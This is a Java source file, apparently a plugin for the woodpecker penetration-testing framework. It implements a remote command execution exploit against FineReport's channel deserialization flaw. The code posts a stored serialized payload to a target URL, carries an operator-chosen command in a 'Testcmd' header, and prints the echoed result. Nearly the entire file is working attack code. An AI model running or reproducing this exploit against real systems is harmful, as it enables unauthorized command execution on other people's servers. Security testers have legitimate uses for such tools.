package plugins.vul.finereport;

import com.google.common.primitives.Bytes;
import org.apache.commons.io.IOUtils;
import plugins.vul.spring.cloud.gateway.CVE_2022_22947_Plugin;
import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.RequestBuilder;
import me.gv7.woodpecker.requests.Requests;
import util.ResourceUtil;

import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class Channel_Deserialization_Exploit implements IExploit {
    private IPluginHelper helper;
    public Channel_Deserialization_Exploit() {
        helper = CVE_2022_22947_Plugin.pluginHelper;
    }

    @Override
    public String getExploitTabCaption() {
        return "命令执行回显";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        IArgsUsageBinder usageBinder = helper.createArgsUsageBinder();

        // 命令参数
        IArg command = helper.createArg();
        command.setName("command");
        command.setRequired(true);
        command.setDefaultValue("whoami");
        command.setDescription("待执行的命令");

        usageBinder.setUsage("command=whoami\n");
        usageBinder.setArgsList(Arrays.asList(command));
        return usageBinder;
    }

    @Override
    public void doExploit(ITarget iTarget, Map<String, Object> map, IResultOutput iResultOutput) throws Throwable {
        String channelUrl = iTarget.getAddress();
        String command = (String) map.get("command");
        byte[] payload = ResourceUtil.getResourceBytes("template/serialize/finereport_channel_deserialization.bin");
        RequestBuilder request = Requests.post(channelUrl)
                .method("POST")
                .body(payload);
        HashMap headers = request.getHeaders();
        headers.put("Testcmd",command);
        request.headers(headers);
        RawResponse response = request.send();

        if (response == null) {
            iResultOutput.errorPrintln("漏洞利用失败");
            return;
        }

        byte[] body = IOUtils.toByteArray(response.body());
        int resultIndex = Bytes.indexOf(body,new byte[]{(byte)0x1F, (byte) 0x8B});
        if (resultIndex != -1){
            byte[] resultBytes = Arrays.copyOf(body,resultIndex);
            iResultOutput.successPrintln("命令执行成功");
            iResultOutput.rawPrintln(new String(resultBytes));
        } else {
            iResultOutput.failPrintln("漏洞利用失败");
        }
    }
}
